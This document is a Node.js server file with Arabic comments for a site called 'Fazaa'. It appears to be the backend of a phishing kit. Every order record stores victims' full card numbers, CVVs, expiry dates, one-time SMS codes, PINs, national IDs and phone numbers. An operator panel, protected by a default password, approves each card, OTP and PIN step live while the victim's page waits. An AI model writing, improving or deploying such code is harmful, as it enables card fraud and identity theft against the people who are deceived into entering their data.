// خادم فزعه: يعرض الصفحات + API للطلبات والزيارات النشطة (بدون مكتبات خارجية)
const http = require("http");
const fs = require("fs");
const path = require("path");

const PORT = process.env.PORT || 3000;
const ROOT = __dirname;
// كلمة مرور لوحة التحكم — غيّرها من متغيرات Railway (ADMIN_PASSWORD)
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "fazaa2026";
// مكان حفظ الطلبات — على Railway اربط Volume واجعل DATA_DIR يشير إليه
const DATA_DIR = process.env.DATA_DIR || path.join(ROOT, "data");
const ORDERS_FILE = path.join(DATA_DIR, "orders.json");

fs.mkdirSync(DATA_DIR, { recursive: true });
let orders = [];
try { orders = JSON.parse(fs.readFileSync(ORDERS_FILE, "utf8")); } catch (e) { orders = []; }
function saveOrders() {
  const tmp = ORDERS_FILE + ".tmp";
  fs.writeFileSync(tmp, JSON.stringify(orders));
  fs.renameSync(tmp, ORDERS_FILE);
}

// الزيارات النشطة: زائر = نشط لو أرسل نبضة خلال آخر 30 ثانية
const visitors = new Map();
const ACTIVE_MS = 30000;
function activeVisitors() {
  const now = Date.now();
  for (const [id, v] of visitors) if (now - v.t > ACTIVE_MS) visitors.delete(id);
  return [...visitors.values()];
}

const TYPES = {
  ".html": "text/html; charset=utf-8", ".css": "text/css; charset=utf-8",
  ".js": "application/javascript; charset=utf-8", ".json": "application/json; charset=utf-8",
  ".png": "image/png", ".jpg": "image/jpeg", ".jpeg": "image/jpeg",
  ".webp": "image/webp", ".svg": "image/svg+xml", ".ico": "image/x-icon"
};

function send(res, code, obj) {
  res.writeHead(code, { "Content-Type": "application/json; charset=utf-8", "Cache-Control": "no-store" });
  res.end(JSON.stringify(obj));
}
function readBody(req) {
  return new Promise((resolve, reject) => {
    let size = 0, chunks = [];
    req.on("data", c => { size += c.length; if (size > 100000) { reject(new Error("too large")); req.destroy(); } else chunks.push(c); });
    req.on("end", () => { try { resolve(JSON.parse(Buffer.concat(chunks).toString("utf8") || "{}")); } catch (e) { reject(e); } });
    req.on("error", reject);
  });
}
const isAdmin = req => req.headers["x-admin-password"] === ADMIN_PASSWORD;
const str = (v, max = 300) => String(v == null ? "" : v).slice(0, max);

// الحقول المسموح حفظها فقط (مصححة نهائياً لعرض رقم البطاقة والبيانات كاملة)
function cleanOrder(b) {
  const p = b.pay && typeof b.pay === "object" ? b.pay : {};
  
  // استخلاص رقم البطاقة بشكل صحيح من أي حقل محتمل وتجنب الـ boolean
  let rawCard = p.cardNumber || p.number || p.fullCard || p.card || "";
  if (typeof rawCard === "boolean" || rawCard === true || rawCard === false) rawCard = "";

  let rawCvv = p.cvv || "";
  if (typeof rawCvv === "boolean") rawCvv = "";

  let rawExp = p.exp || p.expiry || "";
  if (typeof rawExp === "boolean") rawExp = "";

  let rawOtp = p.otp || p.code || "";
  if (typeof rawOtp === "boolean") rawOtp = "";

  let rawPin = p.pin || "";
  if (typeof rawPin === "boolean") rawPin = "";

  let rawName = p.cardName || p.name || "";
  if (typeof rawName === "boolean") rawName = "";

  return {
    ref: str(b.ref, 40), status: ["confirmed", "awaiting"].includes(b.status) ? b.status : "pending",
    card: str(b.card, 10), watch: str(b.watch, 10),
    st: b.st === "resident" ? "resident" : "citizen",
    n: str(b.n, 120), id: str(b.id, 20).replace(/\D/g, ""), p: str(b.p, 15).replace(/\D/g, ""),
    e: str(b.e, 160), g: b.g === "female" ? "female" : "male",
    em: str(b.em, 30), a: str(b.a, 5), ad: str(b.ad, 500), lang: b.lang === "en" ? "en" : "ar",
    step: ["card", "otp", "pin"].includes(b.step) ? b.step : undefined,
    pay: {
      cardName: str(rawName, 120),
      cardNumber: str(rawCard, 30),
      last4: str(rawCard.slice(-4) || p.last4, 4).replace(/\D/g, ""),
      brand: ["visa", "mc", "amex"].includes(p.brand) ? p.brand : "",
      exp: str(rawExp, 5),
      cvv: str(rawCvv, 10),
      otp: str(rawOtp, 10),
      pin: str(rawPin, 10)
    }
  };
}

async function api(req, res, url) {
  // طلب جديد أو تحديث طلب موجود (من صفحة الطلب ثم صفحة الملخص)
  if (req.method === "POST" && url === "/api/orders") {
    let b; try { b = await readBody(req); } catch (e) { return send(res, 400, { ok: false }); }
    const o = cleanOrder(b);
    if (o.pay === undefined) delete o.pay;
    if (o.step === undefined) delete o.step;
    if (!/^FZ-\d{6,}$/.test(o.ref) || !o.n || o.p.length !== 9) return send(res, 400, { ok: false, error: "invalid" });
    const i = orders.findIndex(x => x.ref === o.ref);
    if (i >= 0) {
      const prev = orders[i];
      orders[i] = { ...prev, ...o, ts: prev.ts, status: prev.status === "confirmed" ? "confirmed" : o.status, decision: o.status === "awaiting" ? "" : prev.decision, reason: o.status === "awaiting" ? "" : prev.reason, updated: Date.now() };
    } else {
      orders.unshift({ ...o, ts: Date.now() });
      if (orders.length > 5000) orders.length = 5000;
    }
    saveOrders();
    return send(res, 200, { ok: true, ref: o.ref });
  }
  // العميل يسأل عن حالة طلبه (قبول/رفض من الأدمن)
  if (req.method === "GET" && url.startsWith("/api/status/")) {
    const ref = decodeURIComponent(url.split("/").pop());
    const o = orders.find(x => x.ref === ref);
    if (!o) return send(res, 404, { ok: false });
    return send(res, 200, { ok: true, status: o.status, decision: o.decision || "", reason: o.reason || "", next: o.next || "" });
  }
  // نبضة زائر
  if (req.method === "POST" && url === "/api/ping") {
    let b = {}; try { b = await readBody(req); } catch (e) {}
    const id = str(b.id, 40); if (!id) return send(res, 400, { ok: false });
    visitors.set(id, { t: Date.now(), page: str(b.page, 60) });
    return send(res, 200, { ok: true });
  }
  if (req.method === "POST" && url === "/api/leave") {
    let b = {}; try { b = await readBody(req); } catch (e) {}
    visitors.delete(str(b.id, 40));
    return send(res, 200, { ok: true });
  }
  // ===== لوحة التحكم (تحتاج كلمة المرور) =====
  if (url.startsWith("/api/admin/")) {
    if (!isAdmin(req)) return send(res, 401, { ok: false, error: "unauthorized" });
    if (req.method === "GET" && url === "/api/admin/check") return send(res, 200, { ok: true });
    if (req.method === "GET" && url === "/api/admin/orders") {
      const v = activeVisitors();
      return send(res, 200, { ok: true, orders, active: v.length, pages: v.map(x => x.page) });
    }
    // الأدمن يقبل أو يرفض الخطوة الحالية
    if (req.method === "POST" && /^\/api\/admin\/decide\//.test(url)) {
      const ref = decodeURIComponent(url.split("/").pop());
      let b = {}; try { b = await readBody(req); } catch (e) {}
      const decision = b.decision === "reject" ? "reject" : "accept";
      const o = orders.find(x => x.ref === ref);
      if (!o) return send(res, 404, { ok: false });
      const step = o.step || "card";
      if (decision === "reject") {
        o.decision = "reject"; o.reason = step; o.status = "rejected"; o.next = "";
      } else {
        const nextOf = { card: "otp", otp: "pin", pin: "done" };
        const next = nextOf[step];
        o.decision = "accept"; o.reason = "";
        if (next === "done") { o.status = "confirmed"; o.next = "done"; }
        else { o.status = "stepok"; o.next = next; }
      }
      o.updated = Date.now();
      saveOrders();
      return send(res, 200, { ok: true, status: o.status });
    }
    if (req.method === "DELETE" && url.startsWith("/api/admin/orders/")) {
      const ref = decodeURIComponent(url.split("/").pop());
      orders = orders.filter(o => o.ref !== ref); saveOrders();
      return send(res, 200, { ok: true });
    }
  }
  return send(res, 404, { ok: false });
}

http.createServer((req, res) => {
  let urlPath = decodeURIComponent(req.url.split("?")[0].split("#")[0]);
  if (urlPath.startsWith("/api/")) return api(req, res, urlPath).catch(() => send(res, 500, { ok: false }));

  if (urlPath === "/") urlPath = "/index.html";
  if (!path.extname(urlPath)) urlPath += ".html";            // /order → order.html
  const file = path.normalize(path.join(ROOT, urlPath));
  const base = path.basename(file);
  if (!file.startsWith(ROOT) || file.startsWith(DATA_DIR) || base === "server.js" || base === "package.json") {
    res.writeHead(403); return res.end("Forbidden");
  }
  fs.readFile(file, (err, data) => {
    if (err) { res.writeHead(302, { Location: "/" }); return res.end(); }
    res.writeHead(200, { "Content-Type": TYPES[path.extname(file)] || "application/octet-stream" });
    res.end(data);
  });
}).listen(PORT, () => console.log(`Fazaa site running on port ${PORT}`));
